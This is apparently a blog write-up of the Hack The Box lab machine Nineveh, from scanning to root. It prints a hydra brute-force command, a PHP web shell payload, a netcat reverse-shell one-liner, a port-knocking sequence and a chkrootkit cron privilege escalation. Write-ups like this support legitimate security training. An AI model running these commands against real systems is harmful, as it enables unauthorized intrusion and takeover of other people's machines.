---
title:     "Hack The Box - Nineveh"
tags: [linux,medium,knockd,lfi,php,cron]
---

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/1.png)

We are going to pwn Nineveh from Hack The Box.

Link : <https://www.hackthebox.eu/home/machines/profile/54>


Lets Begin with our Initial Nmap Scan.

## Nmap Scan Results:

```
PORT    STATE SERVICE
80/tcp  open  http
443/tcp open  https

PORT    STATE SERVICE  VERSION
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
| ssl-cert: Subject: commonName=nineveh.htb/organizationName=HackTheBox Ltd/stateOrProvinceName=Athens/countryName=GR
| Not valid before: 2017-07-01T15:03:30
|_Not valid after:  2018-07-01T15:03:30
|_ssl-date: TLS randomness does not represent time
| tls-alpn: 
|_  http/1.1
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 4.11 (92%), Linux 3.12 (92%), Linux 3.13 (92%), Linux 3.13 or 4.2 (92%), Linux 3.16 (92%), Linux 3.16 - 4.6 (92%), Linux 3.18 (92%), Linux 3.2 - 4.9 (92%), Linux 3.8 - 3.11 (92%), Linux 4.2 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
```
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/2.png)

Lets start our Gobuster and see whats in the webpage.


## GoBuster Results :

> http://nineveh.htb/

```
===============================================================
Gobuster v3.0.1
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@_FireFart_)
===============================================================
[+] Url:            http://10.10.10.43
[+] Threads:        10
[+] Wordlist:       /usr/share/wordlists/dirb/common.txt
[+] Status codes:   200,204,301,302,307,401,403
[+] User Agent:     gobuster/3.0.1
[+] Timeout:        10s
===============================================================
2020/01/23 20:31:19 Starting gobuster
===============================================================
/.hta (Status: 403)
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/index.html (Status: 200)
/info.php (Status: 200)
/server-status (Status: 403)
/department (Status: 301)
===============================================================
2020/01/23 20:33:44 Finished
===============================================================
```

While looking at the webpages , found a login page in ```/department/login.php```
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/3.png)

So I tried admin:admin I get invalid password so there must be admin user , lets try bruteforce using ``hydra``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/4.png)

Before that we need to capture the login intercept in burp to see how username and password are represented!

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/5.png)

Now start ``hydra``

``` hydra -l admin -P /usr/share/wordlists/rockyou.txt https://nineveh.htb/ -V -f http-post-form '/db/index.php:password=^PASS^&remember=yes&login=Log+In&proc_login=true:invalid password' ```

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/6.png)


```
-f / -F   exit when a login/pass pair is found (-M: -f per host, -F global)
-v / -V / -d  verbose mode / show login+pass for each attempt / debug mode 
```
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/7.png)<br/>
We got the creds ```admin:1q2w3e4r5t```

Lets try login<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/8.png)

While checking the ``Notes`` tab it show us some message, I have no idea what it is so lets enumerate more!! And It looks like LFI on the URL.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/9.png)

So we know there is a ``HTTPS Port (443)`` is open so lets see whats there

### Dirsearch Results:

>https://nineveh.htb/

```
 _|. _ _  _  _  _ _|_    v0.3.9
(_||| _) (/_(_|| (_| )

Extensions: html, php, txt | HTTP method: get | Threads: 10 | Wordlist size: 4614

Error Log: /root/hacking-tools/dirsearch/logs/errors-20-01-24_19-49-47.log

Target: https://10.10.10.43/

[19:49:49] Starting: 
[19:49:50] 200 -   49B  - /
[19:49:51] 403 -  291B  - /.hta
[19:50:27] 301 -  309B  - /db  ->  https://10.10.10.43/db/
[19:50:52] 200 -   49B  - /index.html
[19:51:41] 403 -  300B  - /server-status
```
There is a login page on ``/db``
Found ``phpLiteAdmin v1.9`` , as usual lets search for exploits

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/10.png)

There is an Remote PHP Code Injection
>https://www.exploit-db.com/exploits/24044

For that we need to login first , I tried with ``admin`` ( Which is default creds of phpLiteAdmin) But it doesn't worked!!
So Lets bruteforce again using ``hydra``
Same as before Intercept the login using burp.<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/11.png)

Since the login page doesn't have any username so we dont need to worry about ``user``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/12-1.png)<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/12.png)<br/>
So the password is ``password123``

And Im in
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/13.png)

According to the exploit we need to first create a database with the extension of ``.php`` so I created ``ninevehNotes.php``
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/14.png)

From there we need to create a table where we need to inject our payload.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/15.png)
``` <?php echo system($_REQUEST["cmd"]); ?>  ```

Once its created and we already know there is a LFI so I tried to execute there.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/16.png)<br/>
It Worked and Why I named it as ``ninevehNotes.php`` is because we know there is a file called ``ninevehNotes.txt``.

Now Its time to get reverse shell, I send it to burp and used reverse shell code.

``` rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.0.0.1 1234 >/tmp/f ```<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/17.png)

And I can't read user flag.

While Checking the ``/var/www/ssl`` directory found something called ``secure_notes``
So Lets have a look on it.

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/18.png)
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/19.png)

I downloaded it to my machine 
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/20.png)

I did ``strings`` and found private key<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/21.png)

We already know ``ssh`` port is filtered it may be because of  ``knockd service``

> Once knockd is installed and running, you modify your firewall rules (e.g. iptables) to drop all incoming traffic to port 22. To the outside world, it's exactly as if you are not running SSH at all.


> Reference : https://www.endpoint.com/blog/2009/11/16/port-knocking-with-knockd

There is a way to bypass it.

> Port Knocking works by opening ports on a firewall by generating a connection attempt on a set of prespecified closed ports. Once a correct sequence of connection attempts is received, the firewall will open the port that was previously closed.

So we need the sequence to open the port.

>https://blog.rapid7.com/2017/10/04/how-to-secure-ssh-server-using-port-knocking-on-ubuntu-linux/

From the blog I came to know we can see the sequence in ``/etc/knockd.conf``<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/22.png)

Yes I got the sequence , Now its time to open.

> https://www.digitalocean.com/community/tutorials/how-to-use-port-knocking-to-hide-your-ssh-daemon-from-attackers-on-ubuntu

``` for x in 571 290 911; do nmap -Pn --max-retries 0 -p $x 10.10.10.43; done ```

![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/23.png)

Now we can use the private key to login<br/>
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/24.png)

## Privilege Escalation:

I uploaded my Linux Enumeration Script and nothing useful , So I tried ``pspy``

>pspy is a command line tool designed to snoop on processes without need for root permissions. It allows you to see commands run by other users, cron jobs, etc. as they execute. Great for enumeration of Linux systems in CTFs. Also great to demonstrate your colleagues why passing secrets as arguments on the command line is a bad idea.

Looks like ``chrkootkit`` running 
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/25.png)

> chkrootkit is a common Unix-based program intended to help system administrators check their system for known rootkits.

I searched in Searchsploit and found
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/26.png)
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/27.png)

I looks like easy , I created a file called Update in ``/tmp`` and started my listener.
![](https://raw.githubusercontent.com/0xw0lf/0xw0lf.github.io/master/img/htb-nineveh/28.png)

Got Root!!



